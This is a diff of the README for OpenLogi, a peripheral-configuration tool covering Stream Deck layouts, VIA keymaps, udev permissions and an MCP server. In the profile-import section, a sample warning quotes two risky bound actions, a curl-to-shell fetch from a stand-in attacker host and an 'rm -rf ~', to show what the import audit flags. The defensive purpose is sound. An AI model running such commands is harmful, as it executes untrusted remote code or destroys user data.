@@ -21,11 +21,16 @@ openlogi streamdeck image 0 icon.png # show a picture on the top-left key
 openlogi streamdeck label 0 "MUTE MIC"  # write a label, sized to fit
 openlogi streamdeck layouts             # the layouts you have saved, by name
 openlogi streamdeck example streaming   # start a layout called "streaming"
+openlogi streamdeck set streaming 0 --label "MUTE MIC"  # set a key, no editor needed
 openlogi streamdeck apply streaming     # apply it by name, from anywhere
 openlogi streamdeck run streaming       # apply it, then act on key presses
 openlogi via                  # QMK/VIA keyboards and macro pads attached
 openlogi via keymap 0         # print layer 0, key by key, with names not numbers
 openlogi via set 0 2 3 F13    # make one key send F13, confirmed by reading it back
+openlogi light list           # standalone lights (Litra) and what each can do
+openlogi light brightness 60  # set a light's brightness
+openlogi backlight status     # keyboard backlight state; `on` and `off` persist it
+openlogi snapshot shot.png    # capture one frame from a webcam
 openlogi mcp                  # serve the agent to an AI assistant over MCP (see below)
 openlogi profile export my-setup # save the whole setup — configuration and layouts
 openlogi profile inspect FILE # show what a profile holds, without applying it
@@ -54,12 +59,26 @@ FIX   Permission to open devices: 4 HID devices are attached and this program
 One thing to fix:
 
 Permission to open devices: ...
-  1. Install the udev rules, which give your user account access to HID devices.
-  2. Reload the rules without rebooting: sudo udevadm control --reload-rules && sudo udevadm trigger
-  3. Unplug the device and plug it back in — a rule applies when a device
+  1. Install the udev rules this project ships: sudo cp
+     packaging/linux/udev/70-openlogi.rules /etc/udev/rules.d/
+  2. Those rules name the vendors this program drives, and the device(s) you
+     cannot open are not among them. Put this line in
+     /etc/udev/rules.d/71-openlogi-local.rules — a separate file, so upgrading
+     this program does not overwrite it:
+  3.     SUBSYSTEM=="hidraw", ATTRS{idVendor}=="0fd9", TAG+="uaccess"
+  4. Reload the rules without rebooting: sudo udevadm control --reload-rules && sudo udevadm trigger
+  5. Unplug the device and plug it back in — a rule applies when a device
      appears, so one already attached keeps the permissions it was given.
-  4. Run openlogi doctor again to confirm.
+  6. Run openlogi doctor again to confirm.
 ```
+
+That third line is the point. The shipped rules name the vendors this program
+drives rather than matching every HID device — a wildcard would hand the
+logged-in user every HID device on the machine, which is a much worse trade
+than one extra line of setup. So a peripheral from a vendor not on that list
+needs a rule, and `doctor` reads the vendor id off the device you cannot open
+and writes the line for you. "Add a udev rule" is a research task; a line with
+the right four hex digits already in it is a step.
 
 Three things about that output are deliberate. **The steps are repeated at the
 end as one numbered list**, because someone who has just heard five checks read
@@ -72,6 +91,10 @@ useful.
 
 Exit status `2` means it checked successfully and found something to fix, which
 is not the same as the command failing.
+
+`--json` prints the same findings as machine-readable data, steps included, for
+a script or another tool. The exit status is identical either way, so adding
+the flag never changes how a script behaves.
 
 ## Everything plugged in
 
@@ -87,9 +110,9 @@ sorts what it finds into three groups:
   what that driver actually lets you change and which command to reach it
   with, so the listing is also the instructions.
 - **Wireless receivers** — a Unifying or Bolt receiver is supported, but it is
-  a way in rather than a peripheral; the devices paired to it are listed in
-  their own right. Filing it under "unsupported" would tell you your mouse was
-  not going to work, which is the opposite of the truth.
+  a way in rather than a peripheral; the mice and keyboards paired to it are
+  what `openlogi list` shows. Filing it under "unsupported" would tell you your
+  mouse was not going to work, which is the opposite of the truth.
 - **Detected, not configurable by this build** — everything else. These are
   never hidden. A device the hub cannot drive is still a device you own, and
   omitting it is how vendor software leaves people unable to tell "not
@@ -99,6 +122,11 @@ sorts what it finds into three groups:
 The closing line gives a total, because a long list read aloud needs one.
 `--supported` narrows the listing to what can be configured, and still prints
 the full count so a shorter list does not read as a smaller desk.
+
+`--json` prints the same survey as machine-readable data — literally the same
+rendering the MCP `list_peripherals` tool returns, so a script and an assistant
+looking at the same desk cannot be told different things. The totals stay
+truthful under `--supported` there too.
 
 Cameras are in the list whoever made them. UVC is a class standard rather than
 a per-vendor protocol — the same brightness, exposure, focus and zoom
@@ -146,6 +174,64 @@ the layout file, so a layout and its icons travel together. Neither the example
 nor a parse error needs a device attached, so you can write and check a layout
 before the hardware arrives.
 
+### Building a layout without a text editor
+
+You never have to open a layout file. `openlogi streamdeck set` writes one key
+at a time:
+
+```sh
+openlogi streamdeck set mydeck 0 --label "MUTE MIC" --background 802020
+openlogi streamdeck set mydeck 1 --label REC --colour ff4040 --action Copy
+openlogi streamdeck unset mydeck 1
+```
+
+There is no need to run `example` first — the first key you set *is* the
+layout. For anyone this saves a step; for anyone working by dictation, editing
+TOML by hand is the difference between this feature being usable and not, which
+is why it works this way.
+
+Three things about it are deliberate:
+
+**Setting a key replaces it, it does not merge.** Saying `--label` again gives
+you the second label and nothing else. A command that quietly kept the old
+background underneath new words would produce a key you did not ask for.
+
+**Mistakes are caught while you are still thinking about that key** — a colour
+that is not six hex digits, an action name this build does not know, or asking
+for words and a picture on the same key. Finding out at apply time, with the
+deck in front of you, is too late to be useful.
+
+**Removing a key that was not there says so**, and exits `2`. Told "removed",
+you would believe something changed and then wonder why the deck looks the
+same.
+
+Keys are kept in deck order in the file however you set them, so a layout in
+git does not churn because of the order you happened to type things.
+
+An action that carries a value — `RunShellCommand`, `TypeText` — has to be
+written in the file rather than passed here. That is not an oversight: those
+are the actions `run` refuses without `--accept-actions`, and adding one should
+be a deliberate act of editing, not a flag on a convenience command.
+
+### Your file stays your file
+
+`set` and `unset` edit the layout's text rather than rewriting it from what
+they parsed, so the comments you wrote, your blank lines, and the order you put
+things in all survive an edit. So do the file's line endings and its
+byte-order mark if it has one — a layout written on Windows stays a file written
+on Windows, rather than coming back with every line changed. That is the same choice OpenLogi already made
+for `config.toml`; layouts were simply missed.
+
+It matters most for the person least able to notice: a rewrite reports success,
+the layout still works, and the only thing gone is the note you left yourself
+about which key is the mic mute. Nothing on screen changes, and there is no
+reason to re-read a file that said it worked.
+
+A new key is appended rather than sorted into place. Sorting would move whole
+blocks around, and a comment at the top of the file — which is attached to
+whatever comes first — would travel with it. Nothing downstream cares about the
+order.
+
 ### Layouts have a home
 
 A bare word is a **name**: `streaming` means the layout saved under that name,
@@ -153,7 +239,7 @@ in `layouts/` inside your configuration directory. Anything with a slash or a
 `.toml` on the end is a **path**, used as written — a layout kept in a git
 repository beside the project it belongs to is a perfectly good place for it.
 
-`openlogi streamdeck layouts` lists what you have saved. Naming layouts rather
+`openlogi streamdeck layouts` lists what you have saved. A layout name is a plain name — no slashes, and no control characters, because the name becomes the filename and the listing prints one per line. A file in that folder whose name breaks that rule is counted and reported rather than listed, so it cannot make the listing disagree with its own count. Naming layouts rather
 than remembering paths is the smaller half of why the library exists; the
 larger half is that a profile bundle can then gather them, so moving to another
 computer moves your decks too. See portable profiles below.
@@ -179,7 +265,9 @@ label = "COPY"
 action = "Copy"
 ```
 
-`openlogi streamdeck apply` only paints the faces. `openlogi streamdeck run
+`openlogi streamdeck apply` only paints the faces. Applying a layout that has
+actions on it says so, because a deck that looks exactly right and does
+nothing is indistinguishable from a broken one. `openlogi streamdeck run
 deck.toml` applies the layout and then stays running: each time you press a
 bound key, its action fires. Actions come from the same catalogue every other
 device here uses, so a Stream Deck key and a mouse button are bound the same
@@ -190,6 +278,17 @@ anything; only a key with no face *and* no action is refused.
 
 Actions fire on the press, not the release, so a key does its thing once per
 push rather than twice.
+
+If the deck is unplugged while `watch` or `run` is going, the command says so
+in those words and exits with status 5, distinct from a failure. It does not
+reconnect on its own: plug it back in and run the same command again. The deck
+gives you no clue by itself — its faces stay lit until it loses power, and the
+keys simply stop doing anything.
+
+Actions run on their own thread, in the order the keys were pressed. A key
+bound to a build, or to anything else that takes its time, therefore delays the
+actions queued behind it but does not stop the deck reading key presses — a
+deck that stops responding is indistinguishable from a cable that has come out.
 
 Some actions run a program or type text — `RunShellCommand`, `RunAppleScript`,
 `OpenApplication`, `TypeText`. A layout carrying any of those is **refused
@@ -210,9 +309,20 @@ is a rendering of it rather than its identity. Capitals, digits and common
 punctuation are drawn; lowercase is drawn as capitals, which are more legible
 at this size.
 
+A label the font cannot draw — accented letters, Japanese, an emoji — renders
+each unsupported character as a hollow box, and the command **says so**, naming
+the characters. That box is perfectly visible if you can see the deck and tells
+you nothing at all if you cannot, while the command otherwise reports plain
+success. Use a picture for anything the font does not carry.
+
 `fill` takes six hex digits; `image` takes any common picture file and scales
 and rotates it to fit the key, so you do not have to know the model's screen
-size or which way its panel is mounted. A picture that is not square is scaled
+size or which way its panel is mounted. Transparency is composited onto black, which is what the key is. Dropping the
+alpha channel instead keeps whatever colour the exporting tool left underneath
+it — often black, so it looks right by accident, and often white, in which case
+an icon arrives as a solid white key with the artwork lost inside it.
+
+A picture that is not square is scaled
 to fit inside the key and centred on black rather than stretched to fill it —
 a wide logo arrives smaller, not squashed into a shape you did not choose.
 
@@ -252,6 +362,44 @@ identical to a user and have completely different answers.
 Running `openlogi` with no subcommand defaults to `list`. Set
 `OPENLOGI_LOG=debug` for verbose tracing in the CLI, GUI, or agent.
 
+## Output written to be heard
+
+For someone who cannot see the screen, the command line is not a fallback
+interface — it is often the only one. So the output here follows rules, and
+those rules are checked rather than remembered:
+
+- **Counts use words.** "1 device", never "1 device(s)" — a screen reader says
+  "device open paren s close paren", every time, in every line.
+- **No drawn rules, boxes, or tick marks.** A line of `====` is heard as
+  repeated punctuation or as nothing at all, box-drawing characters are read
+  one per character, and a tick alone carries meaning that a listener never
+  receives. Anything a symbol would say is said in a word as well.
+- **Every status line is labelled.** `doctor` prefixes each check with `OK`,
+  `NOTE` or `FIX`, so nothing depends on colour or position.
+
+A test sweeps the rendered output of every command for those patterns. It runs
+over synthesized reports as well as real runs, because output that needs
+hardware to produce cannot be checked by running the program on a machine with
+none — which is every machine this project is developed on.
+
+## Lights, backlight, and snapshots
+
+Three commands inherited from upstream, listed here because `openlogi devices`
+now points at them and a command it names should be one you can read about.
+
+`openlogi light` drives a standalone Logitech light such as a Litra: `list`
+shows each light and the controls it advertises, and `on`, `off`, `brightness`
+and `temperature` change it. Brightness takes either a percentage or native
+lumens; temperature takes Kelvin.
+
+`openlogi backlight` reads or sets a keyboard's backlight over HID++, and `on`
+and `off` are persistent — the keyboard keeps the setting rather than reverting
+when ambient light changes. `--device` picks between several paired keyboards
+by name.
+
+`openlogi snapshot` captures one frame from a webcam to a PNG, which is the
+quickest way to see what a camera setting actually did.
+
 ## QMK and VIA macro pads
 
 `openlogi via` reads and changes what each key sends on any QMK keyboard or
@@ -271,12 +419,26 @@ slog.
   would bury the keys that exist. The count at the end means nothing goes
   missing silently.
 - `openlogi via get <layer> <row> <column>` — one position.
+
+Reading a keymap is one USB round trip per position, and VIA gives no way to
+ask a board how big its matrix is — so the read covers an area you choose, and
+stops at 32 by 32 however much more is asked for. That is roughly twice the
+largest edge any real board has. A read cut down says so, because a scan that
+quietly stopped short looks exactly like a keyboard with nothing on it.
+
 - `openlogi via set <layer> <row> <column> <key>` — assign a key.
 
 Keys are named, not numbered: `F13`, `KC_F13`, `f13` and `0x0068` all work, and
 what comes back is `F13` rather than `0x0068`. A keymap dumped as numbers tells
 nobody anything; dumped as names it is something you can reason about, say out
 loud, and write down.
+
+Every answer from the board is checked against the question: not just that it
+replied to the right command, but that it replied about the right key. Every
+keycode reply carries the same command byte, so the command alone cannot tell
+one position's answer from the previous one's — and `keymap` walks the matrix
+in a tight loop, where a single stale report would shift every answer after it
+and print a keymap that is confidently wrong.
 
 ### Why `set` is careful
 
@@ -286,6 +448,10 @@ it, and this tool is then the tool they have to use to fix it. So:
 - The protocol revision is checked before anything is written. VIA's payload
   layouts have changed between revisions, and a board reporting one this build
   does not implement is **refused rather than guessed at**.
+- A board that goes quiet is given two seconds and then reported, rather than
+  waited on. A command that hangs with nothing on screen is indistinguishable,
+  working by ear, from the program having crashed — which makes it a worse
+  outcome than any error message.
 - A key name that cannot be resolved is refused before the device is even
   opened — the name is wrong whether or not a keyboard is attached, and "no VIA
   device found" would send you hunting the wrong problem.
@@ -300,6 +466,12 @@ QMK's quantum keycodes are real and worth adding, but their numbering is QMK's
 own rather than a published standard's, and a wrong entry would rename a key
 that is not what it claims — or be written back to a board. An unnamed keycode
 renders here as its number, which is honest; a misnamed one would not be.
+
+`doctor` checks that devices can be *written to*, not only opened. This program
+changes settings, so a rule that grants reading and not writing — `MODE="0644"`
+where `0660` was meant — leaves every listing working and every change failing,
+which is the most confusing shape a permissions problem takes. The rules this
+project ships use `TAG+="uaccess"`, which grants both.
 
 ## Portable profiles
 
@@ -327,6 +499,14 @@ bindings, per-app overlays, camera settings. Any other path writes a **bundle**
 — a folder holding that same configuration plus every saved Stream Deck layout,
 icons included. `import` takes either.
 
+Exporting again over an earlier bundle copies in without deleting anything, so
+a layout you have removed since is still in that folder. The export names those
+rather than removing them: that folder is a path you chose, and quietly
+deleting inside it is not a risk worth taking for tidiness. Importing works the
+same way in reverse — a layout this machine already had survives an import that
+does not mention it, because an import adds a setup rather than replacing the
+machine.
+
 A bundle is a folder rather than a zip on purpose. The promise this project
 makes is that your settings are plain text you can read and edit, and an
 archive would take that back for the sake of one fewer thing to copy. A folder
@@ -351,6 +531,8 @@ you trust the source:
   keyboard.bindings.f13: RunShellCommand — curl http://evil.example/x.sh | sh
   keyboard.bindings.f14: TypeText — rm -rf ~
 ```
+
+The list of what counts as risky is not maintained by hand alone: a test reads every action variant out of the deserializer itself and fails until each one is classified as risky or reviewed-safe. An action added later that runs something would otherwise pass the audit silently, on the one code path whose whole job is refusing that.
 
 `openlogi profile inspect` shows the same report without applying anything, and
 `--accept-actions` on `import` is how you say you trust the source. Key chords
@@ -408,6 +590,19 @@ The tools exposed are:
 | `set_stream_deck_key_colour` | Fill one key with a colour |
 | `set_stream_deck_key_label` | Write a text label on one key, sized to fit |
 | `clear_stream_deck` | Turn every key black |
+| `list_layouts` / `apply_layout` | Saved deck layouts, restored whole by name |
+| `set_layout_key` / `unset_layout_key` | Edit one key of a saved layout, reporting what it replaced |
+| `list_keyboards` | QMK/VIA boards attached, with protocol revision and layer count |
+| `read_keymap` | A layer's keys, by name rather than by number |
+| `set_key` | Change what one key sends, confirmed by reading it back |
+| `diagnose` | Why devices are not being found, and the steps that fix it |
+
+The layout tools address layouts **by name only**. The command line takes a
+name or a path, because someone who types a path means that path; this surface
+does not, because its argument comes from a model that can be steered by
+whatever it has been reading. A name that looks like a path is refused, and the
+refusal points at `list_layouts` so the model corrects itself rather than
+retrying.
 
 `list_peripherals` is the one to reach for when the question is "what do I
 have plugged in". It spans vendors, where `list_devices` covers only Logitech
@@ -424,6 +619,39 @@ CLI's own. Enumeration there is deliberately **not** filtered by vendor: the
 same UVC registers answer on an Elgato, an Obsbot or a built-in camera, so
 restricting the list to one manufacturer would hide devices that are in fact
 controllable.
+
+`diagnose` is what an assistant should reach for when a device the person says
+is plugged in does not appear. It hands back the same findings `openlogi
+doctor` prints, as data — and says plainly that the steps are for the person to
+carry out, since only they can install system rules or grant access. A model
+that reads "install the udev rules" as an instruction to itself will either
+fail or, worse, try.
+
+`apply_layout` exists so "put my streaming layout back" is one call rather than
+thirty-two.
+
+Editing a layout through an assistant took some deciding. The first version of
+these tools deliberately had none: a layout is something a person composed, the
+deck's own memory is not a copy of it, and an assistant rewriting one on a
+misunderstanding would destroy work with nothing to restore from. That holds
+against rewriting a *file* — and not against setting one key, which is what
+people actually ask for. "Put MUTE MIC on the top left of my streaming layout"
+is a sentence, and refusing it while the command line does it happily is a gap
+in the interface a blind user relies on most.
+
+So `set_layout_key` and `unset_layout_key` edit **one key at a time, never the
+whole file**, and every change reports the key as it was, so the assistant can
+offer to put it back. That is the same shape `set_key` takes for keyboards, and
+for the same reason: a permanent change is acceptable when the answer carries
+what it takes to undo it. Actions that run a program or type text still have to
+be written in the file by the person — those are exactly what `run` refuses
+without `--accept-actions`.
+
+The keyboard tools take and give keys by name — `F13`, not `0x0068`. An
+assistant relaying "your key is zero x zero zero six eight" has relayed nothing
+usable. `set_key` reports what was there before the change, so the model can
+offer to put it back, and an unrecognised name is refused with the vocabulary
+that does exist rather than a bare rejection the model would only guess against.
 
 The Stream Deck tools answer with a key's row and column as well as its index,
 for the same reason the CLI does: an index alone is not something anyone can
